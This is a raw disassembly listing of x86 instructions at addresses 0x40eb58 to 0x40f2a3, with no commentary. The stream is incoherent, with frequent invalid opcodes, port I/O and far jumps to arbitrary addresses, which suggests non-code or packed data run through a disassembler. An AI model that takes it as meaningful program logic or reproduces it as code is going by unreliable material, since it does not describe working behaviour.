  40eb58:	loopne 0x40eb6c
  40eb5a:	mov    dl,0xe6
  40eb5c:	fnstenv [esi-0x71]
  40eb5f:	icebp  
  40eb60:	jecxz  0x40eb26
  40eb62:	jp     0x40ebdc
  40eb64:	cwde   
  40eb65:	jne    0x40eb36
  40eb67:	jg     0x40eb0c
  40eb69:	fwait
  40eb6a:	mov    dh,0x62
  40eb6c:	es (bad) 
  40eb6f:	es inc ebx
  40eb71:	movd   mm1,DWORD PTR [edx+esi*1-0x10]
  40eb76:	out    0xbf,eax
  40eb78:	ins    DWORD PTR es:[edi],dx
  40eb79:	scas   eax,DWORD PTR es:[edi]
  40eb7a:	in     al,dx
  40eb7b:	out    dx,al
  40eb7c:	pushf  
  40eb7d:	out    dx,eax
  40eb7e:	bound  edx,QWORD PTR [edi]
  40eb80:	jmp    0x40eb74
  40eb82:	pusha  
  40eb83:	je     0x40ebdc
  40eb85:	inc    ebx
  40eb86:	repnz cld 
  40eb88:	es push ds
  40eb8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8b:	stos   BYTE PTR es:[edi],al
  40eb8c:	aas    
  40eb8d:	(bad)  
  40eb8e:	leave  
  40eb8f:	add    esi,DWORD PTR [eax+eiz*1]
  40eb92:	mov    ah,bl
  40eb94:	rol    DWORD PTR [edi+0x7c],0x49
  40eb98:	cli    
  40eb99:	jge    0x40ec0c
  40eb9b:	sub    BYTE PTR [ecx],bl
  40eb9d:	pop    ebp
  40eb9e:	xchg   edx,esp
  40eba0:	je     0x40eb53
  40eba2:	icebp  
  40eba3:	clc    
  40eba4:	mov    ds:0x16e918ff,al
  40eba9:	xor    DWORD PTR [edx+0x3a],ebx
  40ebac:	jb     0x40eb89
  40ebae:	jg     0x40ebcd
  40ebb0:	dec    esp
  40ebb1:	out    0xc0,al
  40ebb3:	adc    eax,0x845babc9
  40ebb8:	lods   eax,DWORD PTR ds:[esi]
  40ebb9:	outs   dx,DWORD PTR ds:[esi]
  40ebba:	mov    esi,0xfce35c11
  40ebbf:	cmp    DWORD PTR cs:[edi-0xa649080],ecx
  40ebc6:	je     0x40eb87
  40ebc8:	add    ch,BYTE PTR [esi-0x8fdb14e]
  40ebce:	inc    edi
  40ebcf:	inc    edi
  40ebd0:	xchg   BYTE PTR [ecx+0x4],dl
  40ebd3:	cdq    
  40ebd4:	or     BYTE PTR [esp+0x42e7b11a],ah
  40ebdb:	inc    ecx
  40ebdc:	pop    esp
  40ebdd:	inc    edx
  40ebde:	loopne 0x40ebe7
  40ebe0:	test   al,0xe8
  40ebe2:	ins    BYTE PTR es:[edi],dx
  40ebe3:	xor    BYTE PTR [esi+ecx*4],bl
  40ebe6:	shl    BYTE PTR [eax-0x2172252f],0x72
  40ebed:	imul   esi,ebp,0xcef24a42
  40ebf3:	xchg   bh,bl
  40ebf5:	gs sbb eax,0xa37f7727
  40ebfb:	rcl    BYTE PTR [eax+eax*1],1
  40ebfe:	jge    0x40ebec
  40ec00:	dec    edx
  40ec01:	mov    al,0x68
  40ec03:	sbb    eax,0xe99d9b15
  40ec08:	add    cl,BYTE PTR [ebx]
  40ec0a:	mov    eax,ds:0x57937e5c
  40ec0f:	mov    esi,0x69be231c
  40ec14:	ror    BYTE PTR [edx],0xea
  40ec17:	(bad)  
  40ec18:	jmp    DWORD PTR [edi-0x21]
  40ec1b:	inc    esi
  40ec1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec1d:	push   es
  40ec1e:	in     eax,0x96
  40ec20:	mov    bh,0xff
  40ec22:	out    0xa3,al
  40ec24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec25:	mov    ebx,0xa805a079
  40ec2a:	xor    eax,0xfa025500
  40ec2f:	inc    edi
  40ec30:	xchg   esi,eax
  40ec31:	xchg   esi,eax
  40ec32:	sub    ebx,esi
  40ec34:	repz sbb DWORD PTR [eax+0x62b4bdd3],ebp
  40ec3b:	daa    
  40ec3c:	stos   DWORD PTR es:[edi],eax
  40ec3d:	push   es
  40ec3e:	sub    al,0x1b
  40ec40:	loope  0x40ecb9
  40ec42:	inc    ebx
  40ec43:	pop    ss
  40ec44:	push   cs
  40ec45:	mov    eax,ds:0x844318fb
  40ec4a:	inc    ebp
  40ec4b:	(bad)  
  40ec4c:	in     eax,0x22
  40ec4e:	enter  0xc357,0x37
  40ec52:	fild   QWORD PTR [ebx]
  40ec54:	arpl   WORD PTR [edi-0x1],cx
  40ec57:	and    al,0x13
  40ec59:	cmp    al,0xab
  40ec5b:	mov    dh,0xa1
  40ec5d:	jmp    0x5b44:0x40c91bda
  40ec64:	call   0x407c:0x7aa7cc98
  40ec6b:	push   0xfffffff8
  40ec6d:	sar    BYTE PTR [esi+0x2f],1
  40ec70:	mov    cl,0x53
  40ec72:	out    dx,eax
  40ec73:	mov    eax,ds:0xf87cb7de
  40ec78:	out    dx,al
  40ec79:	scas   al,BYTE PTR es:[edi]
  40ec7a:	mov    ds:0xb47020be,al
  40ec7f:	or     al,0xce
  40ec81:	hlt    
  40ec82:	or     DWORD PTR [eax+0x5b],0x40a3ff36
  40ec89:	int    0xde
  40ec8b:	xor    ecx,edx
  40ec8d:	jno    0x40ec50
  40ec8f:	test   BYTE PTR [ebx-0x51],ah
  40ec92:	mov    esp,0x168abd42
  40ec97:	adc    eax,0x4cb9227c
  40ec9c:	popf   
  40ec9d:	jbe    0x40ec61
  40ec9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eca0:	inc    edi
  40eca1:	fcomp  QWORD PTR [edi+0x2fc4e588]
  40eca7:	mov    esp,0xa48d47b1
  40ecac:	loop   0x40ec43
  40ecae:	xchg   ebp,eax
  40ecaf:	dec    ebp
  40ecb0:	xchg   edi,eax
  40ecb1:	popf   
  40ecb2:	mov    ?,WORD PTR [esp+ebp*4-0x38]
  40ecb6:	inc    ebx
  40ecb7:	cdq    
  40ecb8:	xchg   ebx,eax
  40ecb9:	sbb    BYTE PTR [ebx+ecx*2+0x2d],ah
  40ecbd:	addr16 retf 
  40ecbf:	sbb    eax,DWORD PTR [edi+esi*2-0x41]
  40ecc3:	or     eax,0x42badc05
  40ecc8:	cmp    al,0x89
  40ecca:	sub    al,0x3f
  40eccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eccd:	mov    cl,0xbc
  40eccf:	sub    eax,0x99252086
  40ecd4:	popa   
  40ecd5:	repz xchg ebp,eax
  40ecd7:	adc    al,0x73
  40ecd9:	push   ebx
  40ecda:	cmp    DWORD PTR [edi+0x6c980de5],esp
  40ece0:	sar    DWORD PTR [edi-0x7e3f1bb2],0xcc
  40ece7:	iret   
  40ece8:	and    DWORD PTR ds:0xdacf9f66,ecx
  40ecee:	stos   DWORD PTR es:[edi],eax
  40ecef:	adc    al,0xe8
  40ecf1:	push   es
  40ecf2:	fcomp  DWORD PTR [ecx-0x52]
  40ecf5:	push   ecx
  40ecf6:	mov    esi,0x80499f2a
  40ecfb:	push   cs
  40ecfc:	push   es
  40ecfd:	jmp    0x1756ca45
  40ed02:	pusha  
  40ed03:	push   eax
  40ed04:	mov    bl,0xce
  40ed06:	sbb    ebx,DWORD PTR [ebx-0x6d]
  40ed09:	pop    ecx
  40ed0a:	xlat   BYTE PTR ds:[ebx]
  40ed0b:	(bad)  
  40ed0c:	scas   al,BYTE PTR es:[edi]
  40ed0d:	mov    dh,0x5d
  40ed0f:	xchg   esp,eax
  40ed10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed11:	push   ds
  40ed12:	or     BYTE PTR [ecx],dh
  40ed14:	sbb    BYTE PTR [ebx-0x5e3785c5],dl
  40ed1a:	xchg   esi,eax
  40ed1b:	adc    BYTE PTR [ecx],dl
  40ed1d:	dec    ebp
  40ed1e:	fwait
  40ed1f:	lock or ebx,esp
  40ed22:	inc    edi
  40ed23:	rcr    BYTE PTR [esi-0x5ac7364a],0x14
  40ed2a:	mov    cl,0xfa
  40ed2c:	dec    ecx
  40ed2d:	lods   eax,DWORD PTR ds:[esi]
  40ed2e:	aas    
  40ed2f:	xchg   ecx,eax
  40ed30:	das    
  40ed31:	fwait
  40ed32:	sub    ah,BYTE PTR [ecx+0x56]
  40ed35:	data16 aam 0xae
  40ed38:	call   0x7ea4:0x1f51a82a
  40ed3f:	ficom  DWORD PTR [edx+eax*8+0x4d]
  40ed43:	test   DWORD PTR [ebp-0x2638c360],esp
  40ed49:	dec    ebp
  40ed4a:	dec    edx
  40ed4b:	stc    
  40ed4c:	ror    DWORD PTR [ebx-0x68],cl
  40ed4f:	addr16 xor al,0x8e
  40ed52:	sbb    al,0x97
  40ed54:	outs   dx,DWORD PTR ds:[esi]
  40ed55:	div    DWORD PTR [edi+0x10b06bae]
  40ed5b:	test   DWORD PTR [eax-0x648db9f9],0x54b51fa9
  40ed65:	sub    eax,0x5c7462a1
  40ed6a:	cli    
  40ed6b:	scas   eax,DWORD PTR es:[edi]
  40ed6c:	ret    0x51d7
  40ed6f:	mov    esi,0xd5594812
  40ed74:	lahf   
  40ed75:	mov    edi,0xedfd90ec
  40ed7a:	xchg   esp,edx
  40ed7c:	cmp    eax,0x50486194
  40ed81:	jno    0x40ed7c
  40ed83:	mov    cl,0x7f
  40ed85:	mov    DWORD PTR [esi+0x321e02e1],ebp
  40ed8b:	xchg   edx,ecx
  40ed8d:	retf   
  40ed8e:	in     al,dx
  40ed8f:	repnz test DWORD PTR [ecx+0x1],ebx
  40ed93:	or     DWORD PTR [edx+0x69],0x9878fa22
  40ed9a:	mov    eax,0xed1c016
  40ed9f:	daa    
  40eda0:	daa    
  40eda1:	fwait
  40eda2:	imul   esp,DWORD PTR [eax],0xf7bfa186
  40eda8:	mov    ah,BYTE PTR [ecx+0x5c35795c]
  40edae:	es (bad) 
  40edb0:	pop    ds
  40edb1:	aam    0x24
  40edb3:	and    BYTE PTR [ecx],ah
  40edb5:	mov    bl,0xfc
  40edb7:	mov    dh,0x44
  40edb9:	and    DWORD PTR [ecx],ecx
  40edbb:	jo     0x40ed57
  40edbd:	mov    DWORD PTR [edx+0x2fd03055],edx
  40edc3:	cmp    al,BYTE PTR [esi]
  40edc5:	jo     0x40ee1e
  40edc7:	sbb    al,0xd5
  40edc9:	add    eax,0xe2f31de9
  40edce:	push   edx
  40edcf:	pop    es
  40edd0:	xchg   edx,eax
  40edd1:	inc    ecx
  40edd2:	out    0x57,al
  40edd4:	jbe    0x40edef
  40edd6:	test   al,0xb
  40edd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd9:	fucomi st,st(5)
  40eddb:	xlat   BYTE PTR ds:[ebx]
  40eddc:	loop   0x40edea
  40edde:	jmp    0x6c0c:0xdb6a
  40ede4:	add    eax,0x87cef58
  40ede9:	rcl    ecx,1
  40edeb:	sbb    al,0xe5
  40eded:	sbb    BYTE PTR ds:0x6cd3627a,0x69
  40edf4:	cwde   
  40edf5:	dec    edi
  40edf6:	push   esi
  40edf7:	xor    al,0x8c
  40edf9:	popf   
  40edfa:	fst    st(5)
  40edfc:	rcl    DWORD PTR [edi+0x21],0x78
  40ee00:	fsubr  QWORD PTR [ebx]
  40ee02:	aas    
  40ee03:	outs   dx,BYTE PTR ds:[esi]
  40ee04:	and    BYTE PTR [esi+0x2],ch
  40ee07:	jmp    0xb8c32c53
  40ee0c:	jbe    0x40ee43
  40ee0e:	(bad)  
  40ee0f:	mov    es,WORD PTR [ebx+ebx*2+0x58e3869b]
  40ee16:	ror    dh,0x7
  40ee19:	test   al,0xdd
  40ee1b:	loope  0x40ed9d
  40ee1d:	jmp    0x6a11:0x22c22a6f
  40ee24:	jo     0x40edab
  40ee26:	test   eax,0xa31ec009
  40ee2b:	sub    BYTE PTR [ebp-0x7f],bl
  40ee2e:	lods   eax,DWORD PTR ds:[esi]
  40ee2f:	ret    
  40ee30:	push   edx
  40ee31:	add    al,0x22
  40ee33:	dec    edi
  40ee34:	cmp    cl,ah
  40ee36:	jne    0x40ee87
  40ee38:	sbb    al,0x2f
  40ee3a:	cmp    BYTE PTR [eax+0x21],0x42
  40ee3e:	dec    eax
  40ee3f:	xchg   ebp,eax
  40ee40:	xchg   edx,eax
  40ee41:	imul   edx,edi,0xffffffd6
  40ee44:	test   DWORD PTR [esi-0x11],esi
  40ee47:	call   0xac12:0x9a39ed0f
  40ee4e:	dec    esi
  40ee4f:	xor    BYTE PTR [ecx+0x7fb0abeb],bh
  40ee55:	jne    0x40ede2
  40ee57:	mov    al,0xcf
  40ee59:	cmp    DWORD PTR [esi-0x29],edi
  40ee5c:	fwait
  40ee5d:	retf   0xb6c2
  40ee60:	std    
  40ee61:	mov    BYTE PTR ds:[esi+esi*8-0xf8853cc],cl
  40ee69:	cmp    esi,DWORD PTR [ecx]
  40ee6b:	repnz mov cl,0x8e
  40ee6e:	xor    bh,ah
  40ee70:	in     eax,0x95
  40ee72:	fimul  DWORD PTR [edi]
  40ee74:	fstp   st(0)
  40ee76:	sub    DWORD PTR [edx+0x77],edx
  40ee79:	push   edx
  40ee7a:	(bad)  
  40ee7b:	push   ebp
  40ee7c:	sahf   
  40ee7d:	lea    edi,[edi-0xd]
  40ee80:	js     0x40ee0a
  40ee82:	scas   eax,DWORD PTR es:[edi]
  40ee83:	adc    cl,BYTE PTR ds:0x47f9f751
  40ee89:	clc    
  40ee8a:	lods   al,BYTE PTR ds:[esi]
  40ee8b:	(bad)  
  40ee8d:	sub    eax,0x50cbdbbf
  40ee92:	push   ebx
  40ee93:	mov    ebx,0xc228c0a9
  40ee98:	int    0x86
  40ee9a:	adc    eax,0x37d2f729
  40ee9f:	int3   
  40eea0:	jg     0x40ee89
  40eea2:	jecxz  0x40eee2
  40eea4:	test   DWORD PTR [ebp+ecx*4-0x481d54ea],ebp
  40eeab:	jl     0x40ee2d
  40eead:	not    edi
  40eeaf:	push   cs
  40eeb0:	std    
  40eeb1:	scas   al,BYTE PTR es:[edi]
  40eeb2:	dec    ecx
  40eeb3:	add    eax,DWORD PTR [ebp-0x2b5fc7bd]
  40eeb9:	pop    ecx
  40eeba:	cmp    al,ch
  40eebc:	push   ebp
  40eebd:	adc    al,0xd8
  40eebf:	pop    esi
  40eec0:	test   al,0x88
  40eec2:	and    dh,BYTE PTR [edx-0x3ad4923]
  40eec8:	push   0x21bcb6cf
  40eecd:	sti    
  40eece:	push   edi
  40eecf:	jecxz  0x40ee85
  40eed1:	cmpxchg DWORD PTR [eax],ecx
  40eed4:	dec    ecx
  40eed5:	aam    0xad
  40eed7:	in     eax,0x57
  40eed9:	inc    ecx
  40eeda:	hlt    
  40eedb:	jae    0x40ef1f
  40eedd:	popa   
  40eede:	mov    dl,0x2a
  40eee0:	xchg   BYTE PTR [ebp-0x6e],bl
  40eee3:	mov    WORD PTR [eax-0x72cd379e],fs
  40eee9:	mov    ebx,0x553f7170
  40eeee:	dec    eax
  40eeef:	cmp    al,0x67
  40eef1:	in     al,0x4e
  40eef3:	arpl   sp,ax
  40eef5:	jne    0x40ef40
  40eef7:	outs   dx,BYTE PTR ds:[esi]
  40eef8:	mov    edi,ebx
  40eefa:	mov    eax,ds:0xfe9ce76e
  40eeff:	pop    esi
  40ef00:	sahf   
  40ef01:	jle    0x40eea0
  40ef03:	push   eax
  40ef04:	pop    esp
  40ef05:	ins    BYTE PTR es:[edi],dx
  40ef06:	or     BYTE PTR [ebp+0x253c5b20],bh
  40ef0c:	add    esp,DWORD PTR [ecx+0x58]
  40ef0f:	xor    DWORD PTR [edx+0x7a1a2ec3],ebx
  40ef15:	scas   al,BYTE PTR es:[edi]
  40ef16:	and    DWORD PTR [eax],edx
  40ef18:	enter  0x3e58,0xe6
  40ef1c:	mov    bh,0x9
  40ef1e:	sbb    DWORD PTR ds:0xc41365e3,esp
  40ef24:	ins    DWORD PTR es:[edi],dx
  40ef25:	lods   eax,DWORD PTR ds:[esi]
  40ef26:	jmp    0x40eee8
  40ef28:	xor    cl,bh
  40ef2a:	mov    esp,0xaa44cea1
  40ef2f:	pusha  
  40ef30:	in     eax,0x92
  40ef32:	jle    0x40ef3c
  40ef34:	enter  0x29fc,0x15
  40ef38:	stos   BYTE PTR es:[edi],al
  40ef39:	dec    esp
  40ef3a:	xor    eax,0x8b86856a
  40ef3f:	icebp  
  40ef40:	push   ecx
  40ef41:	adc    al,0x39
  40ef43:	or     al,0x23
  40ef45:	mov    cl,ch
  40ef47:	in     eax,0xa
  40ef49:	test   DWORD PTR [ebx+0xf],esp
  40ef4c:	cmp    ch,BYTE PTR [edx+0x378b7394]
  40ef52:	jns    0x40efc4
  40ef54:	mov    esp,0xe216c8d6
  40ef59:	ins    DWORD PTR es:[edi],dx
  40ef5a:	dec    ecx
  40ef5b:	and    eax,0xff757177
  40ef60:	xchg   BYTE PTR [ebp-0x4a6f4c2b],cl
  40ef66:	add    edx,DWORD PTR [edi-0x7add3eae]
  40ef6c:	inc    esi
  40ef6d:	int    0x47
  40ef6f:	adc    dl,BYTE PTR [ebx-0x4b6add73]
  40ef75:	ss mov eax,0xc893bd3c
  40ef7b:	out    dx,eax
  40ef7c:	xchg   edx,eax
  40ef7d:	(bad)  
  40ef7e:	arpl   cx,ax
  40ef80:	jae    0x40efcc
  40ef82:	and    al,0x91
  40ef84:	push   ebx
  40ef85:	mov    bl,BYTE PTR [esi+0x33]
  40ef88:	imul   dl
  40ef8a:	in     al,dx
  40ef8b:	dec    edx
  40ef8c:	add    DWORD PTR [eax+0x17],ebp
  40ef8f:	cli    
  40ef90:	fist   WORD PTR [edi]
  40ef92:	sbb    BYTE PTR [edx+0x72],bh
  40ef95:	and    al,0x5
  40ef97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef98:	push   ss
  40ef99:	sar    DWORD PTR [eax+0x2e9928b1],cl
  40ef9f:	scas   al,BYTE PTR es:[edi]
  40efa0:	cmp    eax,0xfc494506
  40efa5:	loope  0x40eff0
  40efa7:	aaa    
  40efa8:	nop
  40efa9:	dec    edi
  40efaa:	repnz mov esp,0x75cbb9d8
  40efb0:	sbb    eax,DWORD PTR [esi]
  40efb2:	call   0x1988:0x5acbe133
  40efb9:	(bad)  
  40efba:	sbb    BYTE PTR [edi-0x1d2382ee],ah
  40efc0:	sbb    al,0x44
  40efc2:	aas    
  40efc3:	hlt    
  40efc4:	cmp    DWORD PTR [edi],ebp
  40efc6:	das    
  40efc7:	fdiv   DWORD PTR [ecx]
  40efc9:	shl    DWORD PTR [ebx-0x25b5a595],0xd0
  40efd0:	push   esp
  40efd1:	cmp    eax,DWORD PTR ss:[ecx+ebp*1]
  40efd5:	mov    dl,0x49
  40efd7:	ror    BYTE PTR [edx+0x24],0x5c
  40efdb:	jmp    0x109b:0xd7517c3
  40efe2:	fdivr  st(4),st
  40efe4:	xor    eax,0xc6a29b55
  40efe9:	gs mov eax,0x1f5a2b0c
  40efef:	call   0x25d4:0xeede51d7
  40eff6:	mov    ebp,edi
  40eff8:	push   ebp
  40eff9:	mov    cl,0xc5
  40effb:	ficom  WORD PTR [edi+0x1a]
  40effe:	sub    bl,bh
  40f000:	jge    0x40efc2
  40f002:	pop    es
  40f003:	test   BYTE PTR [eax+0xb15fdc3],bl
  40f009:	jmp    0xa7bed
  40f00e:	ins    DWORD PTR es:[edi],dx
  40f00f:	mov    esi,0x588bb829
  40f014:	fucom  st(6)
  40f016:	imul   esp,DWORD PTR [ebx],0xddcaa183
  40f01c:	cmp    DWORD PTR [edx-0x61],ebp
  40f01f:	xchg   ecx,eax
  40f020:	test   DWORD PTR [ecx],ecx
  40f022:	adc    edi,edx
  40f024:	mov    ds:0xed818ddc,eax
  40f029:	stc    
  40f02a:	jmp    0x7d46d829
  40f02f:	xor    ecx,DWORD PTR [edx-0x5e23b7b]
  40f035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f036:	push   es
  40f037:	stos   DWORD PTR es:[edi],eax
  40f038:	or     eax,0x981ce5b5
  40f03d:	(bad)  
  40f03e:	(bad)  
  40f03f:	mov    ebp,0xcb28f084
  40f044:	xchg   ebp,eax
  40f045:	xor    eax,DWORD PTR [edx-0x56]
  40f048:	imul   esi,DWORD PTR ds:0x150aa0c0,0x26015a21
  40f052:	xchg   esi,eax
  40f053:	and    DWORD PTR [ebx],esp
  40f055:	scas   eax,DWORD PTR es:[edi]
  40f056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f057:	test   BYTE PTR [edi],al
  40f059:	daa    
  40f05a:	pushw  ss
  40f05c:	fist   DWORD PTR [edi+0x6f]
  40f05f:	je     0x40f015
  40f061:	jle    0x40f0b6
  40f063:	sbb    eax,DWORD PTR [eax+edi*8-0x2e17f021]
  40f06a:	imul   eax
  40f06c:	lds    edx,FWORD PTR [ebp-0x11]
  40f06f:	jecxz  0x40f0bf
  40f071:	sbb    DWORD PTR [ecx+0x75],esi
  40f074:	add    ebp,DWORD PTR [ebx+0x2f]
  40f077:	rcl    BYTE PTR [eax+eax*1],0xe9
  40f07b:	xor    al,0x21
  40f07d:	lds    edi,FWORD PTR [ebx]
  40f07f:	cmp    eax,0x67253f41
  40f084:	and    DWORD PTR [edi+esi*2+0x39],ebp
  40f088:	cmp    al,0x79
  40f08a:	cdq    
  40f08b:	mov    dl,0x84
  40f08d:	inc    esp
  40f08e:	pop    ecx
  40f08f:	adc    al,cl
  40f091:	push   eax
  40f092:	mov    al,0xa1
  40f094:	pop    edx
  40f095:	mov    ebp,0x325a2d73
  40f09a:	fdivrp st(6),st
  40f09c:	in     al,dx
  40f09d:	jp     0x40f11e
  40f09f:	(bad)  
  40f0a0:	shl    BYTE PTR [ebp+0x3644c083],1
  40f0a6:	mov    esp,0xcf6cbf97
  40f0ab:	fsub   QWORD PTR [ecx+edi*8+0x4f]
  40f0af:	cdq    
  40f0b0:	jl     0x40f046
  40f0b2:	imul   ebx,DWORD PTR [ecx-0x6b],0xb4ef621d
  40f0b9:	sbb    ah,bh
  40f0bb:	jmp    FWORD PTR [edi-0x34118de8]
  40f0c1:	mov    edx,0xc04f7e72
  40f0c6:	mov    edx,0xfb69876
  40f0cb:	xlat   BYTE PTR ds:[ebx]
  40f0cc:	jp     0x40f0d6
  40f0ce:	icebp  
  40f0cf:	mov    ebp,0x7a6b7645
  40f0d4:	icebp  
  40f0d5:	loopne 0x40f0c2
  40f0d7:	jmp    FWORD PTR [esi-0x5231d168]
  40f0dd:	bound  esp,QWORD PTR [eax+0x42]
  40f0e0:	outs   dx,BYTE PTR ds:[esi]
  40f0e1:	sbb    ah,dl
  40f0e3:	add    BYTE PTR [edx-0x5],bh
  40f0e6:	retf   0x7d91
  40f0e9:	cli    
  40f0ea:	xor    ebx,eax
  40f0ec:	js     0x40f14d
  40f0ee:	out    dx,al
  40f0ef:	push   ds
  40f0f0:	sub    bl,BYTE PTR [eax+0x15]
  40f0f3:	inc    eax
  40f0f4:	mov    ecx,0x2075540f
  40f0f9:	(bad)  [edx+0x7955beda]
  40f0ff:	adc    DWORD PTR [esi+edx*1],ecx
  40f102:	inc    esi
  40f103:	and    BYTE PTR [ecx-0x5a],bl
  40f106:	fld    st(7)
  40f108:	pop    ss
  40f109:	add    DWORD PTR [esi],ebx
  40f10b:	pop    edi
  40f10c:	mov    al,0xb4
  40f10e:	out    0xd9,eax
  40f110:	mov    ds:0xf3bfc33f,al
  40f115:	sub    BYTE PTR [edi],0x84
  40f118:	pop    ecx
  40f119:	inc    edi
  40f11a:	(bad)  [ecx+ebx*2]
  40f11d:	pop    ecx
  40f11e:	mov    DWORD PTR [eax],edx
  40f120:	mov    ?,WORD PTR [eax+ecx*2]
  40f123:	and    ebp,0xffffffab
  40f126:	or     al,0x95
  40f128:	ret    
  40f129:	sub    eax,0xe3150684
  40f12e:	cs stos DWORD PTR es:[edi],eax
  40f130:	nop
  40f131:	rol    BYTE PTR [esi+0x79],0x5b
  40f135:	or     BYTE PTR [esi],dl
  40f137:	mov    ebx,ebp
  40f139:	push   ebx
  40f13a:	lahf   
  40f13b:	clc    
  40f13c:	in     eax,dx
  40f13d:	xchg   BYTE PTR [eax+0x3cbda906],ch
  40f143:	test   eax,0xc70094ed
  40f148:	inc    eax
  40f149:	in     al,dx
  40f14a:	jge    0x40f1a4
  40f14c:	pop    ss
  40f14d:	js     0x40f0d5
  40f14f:	(bad)  
  40f151:	inc    ecx
  40f152:	mov    dl,0x48
  40f154:	clc    
  40f155:	lahf   
  40f156:	xchg   ebx,eax
  40f157:	adc    BYTE PTR [ebx],cl
  40f159:	xor    eax,DWORD PTR [esi]
  40f15b:	lahf   
  40f15c:	cmp    ch,BYTE PTR [eax-0xb7d4d92]
  40f162:	in     eax,0x18
  40f164:	out    0x41,al
  40f166:	test   eax,0x571d57da
  40f16b:	jbe    0x40f0ff
  40f16d:	add    DWORD PTR [ebx],ebp
  40f16f:	xor    DWORD PTR [ebx-0x406637c1],esp
  40f175:	inc    esp
  40f176:	pushf  
  40f177:	add    DWORD PTR [edx],ebx
  40f179:	lahf   
  40f17a:	jmp    0xbe9d707e
  40f17f:	nop
  40f180:	imul   edi,eax,0xfffffffb
  40f183:	in     eax,0x19
  40f185:	mov    al,ds:0x678d2011
  40f18a:	xchg   dl,bl
  40f18c:	ror    DWORD PTR [eax],0xa6
  40f18f:	push   ecx
  40f190:	loopne 0x40f187
  40f192:	xchg   ebp,eax
  40f193:	push   edx
  40f194:	push   esi
  40f195:	into   
  40f196:	loopne 0x40f1ed
  40f198:	fcomp  st(4)
  40f19a:	adc    eax,0xfd5371c4
  40f19f:	(bad)  
  40f1a0:	loope  0x40f1d8
  40f1a2:	lea    esi,[esp+ebp*4]
  40f1a5:	sahf   
  40f1a6:	inc    esi
  40f1a7:	push   edi
  40f1a8:	xchg   BYTE PTR [ebx+0x7d],bh
  40f1ab:	cmp    BYTE PTR gs:[ebx],dh
  40f1ae:	mov    DWORD PTR [ebx+0x72cbe97d],ebp
  40f1b4:	das    
  40f1b5:	sbb    DWORD PTR [ecx],edx
  40f1b7:	adc    DWORD PTR [edx+ecx*8+0x6c8f3099],edi
  40f1be:	adc    bl,ah
  40f1c0:	mov    al,ds:0xab89e661
  40f1c5:	sub    DWORD PTR [ebx+0x13f7e8f5],edi
  40f1cb:	push   es
  40f1cc:	clc    
  40f1cd:	or     BYTE PTR [ecx+edi*1-0x44],dh
  40f1d1:	sti    
  40f1d2:	pop    ss
  40f1d3:	int    0x46
  40f1d5:	fst    QWORD PTR [edi]
  40f1d7:	mov    esp,0x1c195181
  40f1dc:	xor    edi,DWORD PTR [ebx]
  40f1de:	jmp    0xee30:0xa209963a
  40f1e5:	dec    eax
  40f1e6:	push   cs
  40f1e7:	scas   al,BYTE PTR es:[edi]
  40f1e8:	pop    ecx
  40f1e9:	(bad)  
  40f1ea:	in     eax,dx
  40f1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1ec:	cli    
  40f1ed:	in     eax,dx
  40f1ee:	lea    edx,[ebx-0x64922cdf]
  40f1f4:	add    DWORD PTR [ebp-0x36f197d5],0xb8bd79f5
  40f1fe:	push   esp
  40f1ff:	iret   
  40f200:	ins    BYTE PTR es:[edi],dx
  40f201:	mov    ds:0xb04b4b23,eax
  40f206:	xor    edi,ebp
  40f208:	mov    al,ds:0x1b1e0b32
  40f20d:	jp     0x40f28b
  40f20f:	cmp    ebp,DWORD PTR [ecx]
  40f211:	daa    
  40f212:	jb     0x40f249
  40f214:	sub    DWORD PTR [edi+esi*1+0x5c8588c8],0xffffff95
  40f21c:	in     eax,dx
  40f21d:	xchg   ebp,eax
  40f21e:	xor    al,0x82
  40f220:	ds daa 
  40f222:	fnstsw WORD PTR [ecx+0x1d0f8d27]
  40f228:	jecxz  0x40f1cf
  40f22a:	push   ecx
  40f22b:	out    dx,eax
  40f22c:	data16 jg 0x40f224
  40f22f:	and    BYTE PTR [ebx+0x50],cl
  40f232:	jl     0x40f245
  40f234:	adc    eax,0x8457612d
  40f239:	mov    bl,0xff
  40f23b:	jg     0x40f265
  40f23d:	shr    BYTE PTR [edx],cl
  40f23f:	sbb    dl,BYTE PTR [eax+0x68c746f5]
  40f245:	test   cl,bh
  40f247:	sub    DWORD PTR [esi+0xca0724c],ecx
  40f24d:	xchg   esi,eax
  40f24e:	add    ecx,DWORD PTR [edi]
  40f250:	mov    dh,0xda
  40f252:	mov    eax,ds:0xdd3ca052
  40f257:	add    dl,BYTE PTR [eax+0x26]
  40f25a:	mov    ah,0xb0
  40f25c:	(bad)  
  40f25d:	sti    
  40f25e:	inc    ebp
  40f25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f260:	mov    esi,0xc0a7ccc4
  40f265:	or     BYTE PTR [ecx],dh
  40f267:	std    
  40f268:	sbb    DWORD PTR [edx],ebx
  40f26a:	xor    BYTE PTR [eax-0xc],0xd2
  40f26e:	and    al,dh
  40f270:	leave  
  40f271:	(bad)  
  40f272:	aaa    
  40f273:	out    dx,eax
  40f274:	and    bl,BYTE PTR [ebp+0x6e]
  40f277:	jp     0x40f217
  40f279:	adc    BYTE PTR [eax+esi*8],ch
  40f27c:	and    BYTE PTR ss:[edx-0x1a279cea],0x2f
  40f284:	push   edx
  40f285:	push   ebx
  40f286:	sub    dl,dh
  40f288:	fdiv   DWORD PTR [ecx-0x6c]
  40f28b:	stos   BYTE PTR es:[edi],al
  40f28c:	push   eax
  40f28d:	add    ah,BYTE PTR [edx-0x6d]
  40f290:	hlt    
  40f291:	pop    esi
  40f292:	lea    esp,[edx-0x75906bd1]
  40f298:	and    eax,0xd0955a4
  40f29d:	mov    al,0xc2
  40f29f:	pop    ds
  40f2a0:	mov    cl,0x6
  40f2a2:	ret    
  40f2a3:	mov    dl,0x32
